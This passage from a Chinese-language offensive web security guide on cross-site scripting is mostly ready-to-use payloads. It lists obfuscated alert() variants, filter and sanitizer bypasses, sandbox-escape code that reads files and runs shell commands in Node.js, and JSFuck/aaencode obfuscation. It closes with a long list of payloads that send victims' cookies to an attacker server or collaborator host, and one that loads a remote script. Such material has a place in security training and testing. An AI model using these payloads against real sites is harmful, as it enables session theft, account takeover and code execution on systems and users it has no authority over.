alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

存在一些 **JS code** 使用了 **不安全且受攻击者控制的数据**，例如 `location.href`。攻击者可以滥用此类数据来执行任意 JS 代码。\
**Due to the extension of the explanation of** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

在那里你会找到对 **什么是 DOM vulnerabilities、如何被触发以及如何利用它们** 的详细解释。\
另外，别忘了在上述文章的末尾可以找到关于 [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering) 的解释。

### 升级 Self-XSS

### Cookie XSS

如果你可以通过将 payload 放入 cookie 来触发 XSS，这通常是 self-XSS。 但是，如果你发现了一个 **vulnerable subdomain to XSS**，你可以滥用该 XSS 在整个域中注入 cookie，从而在主域或其他子域（那些对 cookie XSS 易受攻击的子域）触发 cookie XSS。为此你可以使用 cookie tossing attack：


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

你可以在 [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html) 中找到对该技术的优秀滥用示例。

### 将你的 session 发送给 admin

也许某个用户可以与 admin 分享他的 profile，如果 self XSS 位于该用户的 profile 中且 admin 访问它，就会触发该漏洞。

### Session Mirroring

如果你发现了某个 self XSS，并且网页为管理员提供了 **session mirroring**，例如允许客户请求帮助，为了帮助你 admin 会看到你在自己 session 中看到的内容（但以他的 session 视角）。 

你可以让 **administrator 触发你的 self XSS** 并窃取他的 cookies/session。

## 其他绕过方法

### 通过 WASM linear-memory template overwrite 绕过 sanitization

当 web 应用使用 Emscripten/WASM 时，常量字符串（例如 HTML format stubs）存放在可写的 linear memory 中。一处 in‑WASM overflow（例如在编辑路径中未检查的 memcpy）可以破坏相邻结构并将写入重定向到这些常量。将诸如 "<article><p>%.*s</p></article>" 的模板覆盖为 "<img src=1 onerror=%.*s>" 会把已被 sanitization 的输入变成 JavaScript handler 值，并在渲染时立即产生 DOM XSS。

查看专门页面以获取利用流程、DevTools memory helpers 和防御方法：

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### 归一化 Unicode

你可以检查 **reflected values** 是否在服务器端（或客户端）被 **unicode normalized**，并滥用此功能来绕过防护。 [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

由于 **RoR mass assignment**，引号会被插入到 HTML 中，从而绕过引号限制，并且可以在标签内部添加额外字段（onfocus）。\
表单示例 ([from this report](https://hackerone.com/reports/709336))，如果你发送 payload：
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
键值对 "Key","Value" 将像这样被回显：
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
然后会插入 onfocus 属性，发生 XSS。

### 特殊组合
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS with header injection in a 302 response

如果你发现可以 **inject headers in a 302 Redirect response**，你可以尝试 **make the browser execute arbitrary JavaScript**。这并非简单，因为现代浏览器在 HTTP 响应状态码为 302 时不会解析响应体，所以单纯的 cross-site scripting payload 无效。

在 [**this report**](https://www.gremwell.com/firefox-xss-302) 和 [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) 你可以阅读如何在 Location header 内测试多种协议，并查看是否有任一协议允许浏览器检查并执行位于响应体内的 XSS payload。\
已知的过去协议：`mailto://`、`//x:1/`、`ws://`、`wss://`、_empty Location header_、`resource://`。

### Only Letters, Numbers and Dots

如果你能够指定 javascript 将要 **execute** 的 **callback** 且该 callback 仅限这些字符，[**Read this section of this post**](#javascript-function) 可以了解如何滥用这种行为。

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 如果你尝试以 **content-type** 如 `application/octet-stream` 加载脚本，Chrome 会抛出以下错误：

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

唯一会支持 Chrome 运行 **loaded script** 的 **Content-Type** 是位于 const **`kSupportedJavascriptTypes`** 中的那些，见 [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### 可导致 XSS 的脚本类型

(来自 [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 那么，可以用来加载脚本的类型有哪些？
```html
<script type="???"></script>
```
答案是：

- **module** (默认，无需解释)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles 是一个功能，允许你将一堆数据（HTML, CSS, JS…）打包到一个 **`.wbn`** 文件中。
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** 允许改进 import 语法
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
此行为在 [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) 中被用来将一个库重映射到 eval；滥用它可以触发 XSS。

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** 该功能主要用于解决由预渲染引起的一些问题。它的工作方式如下：
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types 导致 XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 以下内容类型可以在所有浏览器中执行 XSS：

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? 不在列表中，但我记得在某个 CTF 中见过)
- application/rss+xml (不触发)
- application/atom+xml (不触发)

在其他浏览器中，其他 **`Content-Types`** 也可以用来执行任意 JS，参见: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

如果页面返回 text/xml content-type，则可以指定一个命名空间并执行任意 JS：
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### 特殊替换模式

当使用类似 **`"some {{template}} data".replace("{{template}}", <user_input>)`** 的写法时，攻击者可以使用 [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) 来尝试绕过某些防护： `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

例如在 [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA)，这被用来在 script 内对 JSON 字符串进行转义并执行任意代码。

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

如果你只有有限的可用字符集，请查看这些针对 XSJail 问题的其他有效解决方案：
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
如果在执行不受信任的代码之前 **everything is undefined**（例如在 [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)），就可以从“无中生有”生成有用的对象来滥用任意不受信任代码的执行：

- Using import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- 间接访问 `require`

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) 模块在 Node.js 中被包裹在一个函数中，如下所示：
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
因此，如果从该模块我们能够**调用另一个函数**，就可以在该函数中使用 `arguments.callee.caller.arguments[1]` 来访问**`require`**：
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
与前面的例子类似，可以**使用错误处理程序**来访问模块的**wrapper**并获取**`require`**函数：
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & 高级 Bypass

- **同一页面中的不同 obfuscations：** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- 更复杂的 JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS 常见 payloads

### 将多个 payloads 合并为 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe 陷阱

使用户在页面中导航而不离开 iframe，并窃取其操作（包括表单中提交的信息）：

{{#ref}}
../iframe-traps.md
{{#endref}}

### 获取 Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
